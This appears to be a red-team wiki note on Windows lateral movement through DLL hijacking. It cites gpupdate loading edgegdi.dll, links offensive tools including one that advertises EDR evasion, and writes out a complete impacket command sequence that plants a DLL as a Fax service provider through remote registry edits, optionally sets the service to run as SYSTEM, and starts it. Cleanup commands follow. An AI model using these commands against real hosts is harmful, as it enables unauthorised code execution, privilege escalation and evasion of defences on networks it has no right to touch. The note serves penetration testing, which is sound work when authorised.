---
title: Lateral Movement trough DLL Hijacking
---

[[notes/lateral-movement/index]] by writing a DLL into a location were a periodically running program will load it.

For example `gpupdate.exe` runs as `NT Authority\Network Service` and loads `C:\Windows\System32\edgegdi.dll` every 90 minutes ([source](http://web.archive.org/web/20220624214207/https://www.mdsec.co.uk/2020/10/i-live-to-move-it-windows-lateral-movement-part-3-dll-hijacking/)).

Untested tools:

- [LatLoader](https://github.com/icyguider/LatLoader), includes evasion for various Elastic EDR rules
- [DCOM DLL Hijacking](https://github.com/WKL-Sec/dcomhijack), upload DLL, trigger load trough DCOM

# Fax Service

First write your DLL to `C:\Windows\System32\msfax.dll`, e.g. over SMB.
On startup the payload must migrate into another process because the fax process dies after loading the DLL.
Then create the registry keys and start the service.

~~~ bash
impacket-services -k -no-pass ws01.corp.com status -name fax
impacket-services -k -no-pass ws01.corp.com stop -name fax
path='HKLM\Software\Microsoft\Fax\Device Providers\{fdd90a36-8160-49b5-af34-3843e4c06417}'
impacket-reg -k -no-pass ws01.corp.com add -keyName "$path"
impacket-reg -k -no-pass ws01.corp.com add -keyName "$path" -v FriendlyName -vt REG_SZ -vd 'Microsoft Fax Provider'
impacket-reg -k -no-pass ws01.corp.com add -keyName "$path" -v ProviderName -vt REG_SZ -vd MicrosoftFaxProvider
impacket-reg -k -no-pass ws01.corp.com add -keyName "$path" -v ImageName -vt REG_EXPAND_SZ -vd 'C:\Windows\System32\msfax.dll'
impacket-reg -k -no-pass ws01.corp.com add -keyName "$path" -v APIVersion -vt REG_DWORD -vd 65536
impacket-services -k -no-pass ws01.corp.com change -name fax -start-name 'NT Authority\System'  # optional
impacket-services -k -no-pass ws01.corp.com start -name fax
~~~

Cleanup.

~~~ bash
impacket-services -k -no-pass ws01.corp.com stop -name fax
impacket-services -k -no-pass ws01.corp.com change -name fax -start-name 'NT Authority\NetworkService'
impacket-reg -k -no-pass ws01.corp.com delete -keyName "$path" -va
~~~

References:

- [TROOPERS22: Unorthodox Lateral Movement: Stepping Away from the Standard Tradecraft](https://www.youtube.com/watch?v=z3kUwvunBIo)
